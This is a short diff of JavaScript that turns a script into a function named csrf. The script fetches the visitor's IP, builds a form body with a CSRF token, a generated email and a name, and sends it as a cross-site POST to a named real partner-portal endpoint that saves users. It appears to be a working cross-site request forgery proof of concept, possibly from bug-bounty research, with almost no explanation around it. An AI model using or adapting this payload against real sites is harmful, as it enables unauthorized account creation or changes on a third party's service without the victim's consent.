@@ -41,7 +41,8 @@ function getIP() {
         .then(data => data.ip);
 }
 
-getIP().then(ip => {
+function csrf(token, key) {
+    getIP().then(ip => {
     var randomEmail = "okpay+"+ip+"@live.com";
     var params = "_Token%5Bfields%5D=" + token;
     params += "&fname=Naysser&";
@@ -56,4 +57,5 @@ getIP().then(ip => {
     x1.open("POST", "https://pan.bitdefender.com/partners/my-users-save/");
     x1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     x1.send(params);
-});
+    });
+}
